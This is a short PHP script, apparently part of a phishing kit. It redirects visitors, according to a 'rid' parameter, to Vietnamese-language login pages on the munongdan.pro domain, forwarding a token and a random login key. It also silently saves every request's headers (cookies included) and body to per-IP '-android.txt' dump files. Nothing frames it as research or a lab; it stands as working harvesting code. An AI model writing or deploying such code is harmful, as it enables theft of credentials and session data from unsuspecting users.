<?php
include_once "config.php";
$rid1 = "4058001";
$rid2 = "4058002";
$rand = $hit->random(17);
if (isset($_GET['rid']) AND ($_GET['rid'] == $rid1)) {
	$token = $_GET['token'];
header("Location: http://idm.munongdan.pro/account/dangnhap.php?token={$token}&loginkey=".base64_encode($rand));
} 
elseif (isset($_GET['rid']) AND ($_GET['rid'] == $rid2)) {
	$token = $_GET['token'];
header("Location: http://idm.munongdan.pro/account2/dangnhap.php?token={$token}&loginkey=".base64_encode($rand));
}else{
	header("Location: http://munongdan.pro");
}
class DumpHTTPRequestToFile {
	public function execute($targetFile) {
		$data = sprintf(
			"%s %s %s\n\nHTTP headers:\n",
			$_SERVER['REQUEST_METHOD'],
			$_SERVER['REQUEST_URI'],
			$_SERVER['SERVER_PROTOCOL']
		);
		foreach ($this->getHeaderList() as $name => $value) {
			$data .= $name . ': ' . $value . "\n";
		}
		$data .= "\nResponse body:\n";
		file_put_contents(
			$targetFile,
			$data . file_get_contents('php://input') . "\n"
		);
	//	echo("Done!\n\n");
	}
	private function getHeaderList() {
		$headerList = [];
		foreach ($_SERVER as $name => $value) {
			if (preg_match('/^HTTP_/',$name)) {
				// convert HTTP_HEADER_NAME to Header-Name
				$name = strtr(substr($name,5),'_',' ');
				$name = ucwords(strtolower($name));
				$name = strtr($name,' ','-');
				// add to list
				$headerList[$name] = $value;
			}
		}
		return $headerList;
	}
}
(new DumpHTTPRequestToFile)->execute('./dump/'.getIP().'-android.txt');
function getIP()
{
if(!empty($_SERVER["HTTP_CLIENT_IP"]))
   $ip = $_SERVER["HTTP_CLIENT_IP"];
else if(!empty($_SERVER["HTTP_X_FORWARDED_FOR"]))
   $ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
else if(!empty($_SERVER["REMOTE_ADDR"]))
   $ip = $_SERVER["REMOTE_ADDR"];
else
   $ip = "xxx.xxx.xxx.xxx";
return $ip;
}
?>
